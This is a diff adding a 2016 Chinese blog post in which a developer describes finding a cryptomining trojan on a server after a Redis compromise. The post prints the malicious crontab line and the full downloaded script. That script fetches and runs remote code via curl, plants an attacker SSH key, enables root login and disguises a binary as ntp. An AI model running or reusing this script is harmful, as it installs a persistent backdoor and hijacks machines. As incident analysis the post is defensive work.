@@ -268,6 +268,140 @@
             
               
                 
+                <a class="post-title-link" href="/2016/08/23/服务器被挂马，执行对外DDoS攻击/" itemprop="url">
+                  服务器被挂马，执行对外DDoS攻击
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-08-23T12:06:19+08:00" content="2016-08-23">
+              2016-08-23
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/技术/" itemprop="url" rel="index">
+                    <span itemprop="name">技术</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/08/23/服务器被挂马，执行对外DDoS攻击/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/23/服务器被挂马，执行对外DDoS攻击/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p><em>发现服务器被当成了肉鸡，不停的向外发包，以致于CPU飙高以及网络拥挤。经过排查发现了一个木马，并杀掉了向外发包的进程，但不能确定系统已经清理完全了，还需要观察</em></p>
+</blockquote>
+<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>执行 <em>top -c</em> 命令，发现异常</p>
+<p><img src="http://oax5iq75d.bkt.clouddn.com/pps.png" alt=""></p>
+<p>这个进程把CPU资源基本耗尽了，当时想找一下进程的启动文件路径，但方式不对，所以就鲁莽的把进程杀掉了。其实可以执行 <em>cd /proc/xxx</em> 命令切换到进程信息目录，其中xxx是进程id，之后执行 <em>ls -al或ll</em> 命令就可以看到进程的启动路径了，如下图中exe所示（示例）：</p>
+<p><img src="http://oax5iq75d.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202016-08-23%2013.05.54.png" alt=""></p>
+<h3 id="查询和清理"><a href="#查询和清理" class="headerlink" title="查询和清理"></a>查询和清理</h3><p>执行crontab -l命令发现原本应当存储cron表达式的文件之中存储的竟然是Redis内容，考虑到之前<a href="http://chenchi.me/2016/08/18/Redis%E2%80%9C%E6%BC%8F%E6%B4%9E%E2%80%9D%EF%BC%8CSSH%E5%85%8D%E7%99%BB%E5%BD%95%E6%94%BB%E5%87%BB/" target="_blank" rel="external">Redis漏洞被攻击过</a>，所以这次挂马的方式应该是类似的，crontab的内容如下所示：</p>
+<p><img src="http://oax5iq75d.bkt.clouddn.com/crontab.png" alt=""></p>
+<p>其中有一条命令引起了我的注意：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*/1 * * * * curl -L http://r.chanstring.com/pm.sh?0703 | sh</div></pre></td></tr></table></figure></p>
+<p>这条命令的意思大致是：<br><font color="red">从0点开始，每隔一个小时去请求参数URL的内容并当作脚本来执行。</font><br>通过浏览器来访问 <em><a href="http://r.chanstring.com/pm.sh?0703" target="_blank" rel="external">http://r.chanstring.com/pm.sh?0703</a></em> ，可以得到木马脚本 <em>pm.sh</em> ，如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin:/usr/bin:/usr/<span class="built_in">local</span>/bin:/usr/sbin</div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?0706 | sh"</span> &gt; /var/spool/cron/root</div><div class="line">mkdir -p /var/spool/cron/crontabs</div><div class="line"><span class="built_in">echo</span> <span class="string">"*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?0706 | sh"</span> &gt; /var/spool/cron/crontabs/root</div><div class="line"></div><div class="line"><span class="keyword">if</span> [ ! <span class="_">-f</span> <span class="string">"/root/.ssh/KHK75NEOiq"</span> ]; <span class="keyword">then</span></div><div class="line">	mkdir -p ~/.ssh</div><div class="line">	rm <span class="_">-f</span> ~/.ssh/authorized_keys*</div><div class="line">	<span class="built_in">echo</span> <span class="string">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzwg/9uDOWKwwr1zHxb3mtN++94RNITshREwOc9hZfS/F/yW8KgHYTKvIAk/Ag1xBkBCbdHXWb/TdRzmzf6P+d+OhV4u9nyOYpLJ53mzb1JpQVj+wZ7yEOWW/QPJEoXLKn40y5hflu/XRe4dybhQV8q/z/sDCVHT5FIFN+tKez3txL6NQHTz405PD3GLWFsJ1A/Kv9RojF6wL4l3WCRDXu+dm8gSpjTuuXXU74iSeYjc4b0H1BWdQbBXmVqZlXzzr6K9AZpOM+ULHzdzqrA3SX1y993qHNytbEgN+9IZCWlHOnlEPxBro4mXQkTVdQkWo0L4aR7xBlAdY7vRnrvFav root"</span> &gt; ~/.ssh/KHK75NEOiq</div><div class="line">	<span class="built_in">echo</span> <span class="string">"PermitRootLogin yes"</span> &gt;&gt; /etc/ssh/sshd_config</div><div class="line">	<span class="built_in">echo</span> <span class="string">"RSAAuthentication yes"</span> &gt;&gt; /etc/ssh/sshd_config</div><div class="line">	<span class="built_in">echo</span> <span class="string">"PubkeyAuthentication yes"</span> &gt;&gt; /etc/ssh/sshd_config</div><div class="line">	<span class="built_in">echo</span> <span class="string">"AuthorizedKeysFile .ssh/KHK75NEOiq"</span> &gt;&gt; /etc/ssh/sshd_config</div><div class="line">	/etc/init.d/sshd restart</div><div class="line"><span class="keyword">fi</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> [ ! <span class="_">-f</span> <span class="string">"/etc/init.d/ntp"</span> ]; <span class="keyword">then</span></div><div class="line">	<span class="keyword">if</span> [ ! <span class="_">-f</span> <span class="string">"/etc/systemd/system/ntp.service"</span> ]; <span class="keyword">then</span></div><div class="line">		mkdir -p /opt</div><div class="line">		curl -fsSL http://r.chanstring.com/v51/lady_`uname -m` -o /opt/KHK75NEOiq33 &amp;&amp; chmod +x /opt/KHK75NEOiq33 &amp;&amp; /opt/KHK75NEOiq33 -Install</div><div class="line">	<span class="keyword">fi</span></div><div class="line"><span class="keyword">fi</span></div><div class="line"></div><div class="line">/etc/init.d/ntp start</div><div class="line"></div><div class="line">ps auxf|grep -v grep|grep <span class="string">"/usr/bin/cron"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"/opt/cron"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div></pre></td></tr></table></figure>
+<p>有了这个脚本之后就可以分析黑客对系统究竟动了什么手脚。而因为脚本是通过网络直接获取并执行的，所以本地并没有脚本文件记录，如果不检查crontab，则很难发现。脚本既注入了定时执行，也注册了SSH免密码登录，<font color="red">还将木马程序伪装成ntp（Linux系统的时间服务是ntpd）</font>。<br><br>因为能力有限，自己暂时只能分析到这一步，百度了一下，原来这个木马叫做minerd木马（挖矿木马），有位仁兄分析的很好（<a href="http://jingyan.baidu.com/article/b7001fe1bf71ee0e7282dddb.html" target="_blank" rel="external">彻底清除Linux centos minerd木马</a>），照着他的步骤做，清晰又明了，还能学习不少知识。</p>
+<h3 id="继续观察"><a href="#继续观察" class="headerlink" title="继续观察"></a>继续观察</h3><p>这个木马是清理掉了，但感觉系统还有别的木马存在。身为一名开发，没有多少运维和安全的经验，一次疏忽就导致了系统被攻击了数次，但实战中的成长是非常迅速的，希望自己能再接再厉，能够保障系统基本的安全。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.itpub.net/24945919/viewspace-744688/" target="_blank" rel="external">Linux中top命令的12个示例</a><br><br><a href="http://blog.csdn.net/tiwen818/article/details/6988105" target="_blank" rel="external">Cron 表达式详解和案例</a><br><br><a href="http://www.cnblogs.com/ericyuan/p/4211352.html" target="_blank" rel="external">Linux 下如何查找木马并处理</a><br><br><a href="http://lovesoo.org/view-processes-running-linux-full-path-method.html" target="_blank" rel="external">Linux查看进程运行的完整路径方法</a><br><br><a href="http://blog.csdn.net/foxman209/article/details/6278093/" target="_blank" rel="external">curl命令详解</a><br></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/08/21/Linux调整-root硬盘空间/" itemprop="url">
                   Linux调整/root硬盘空间
                 </a>
@@ -996,7 +1130,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">5</span>
+              <span class="site-state-item-count">6</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1013,7 +1147,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-count">11</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
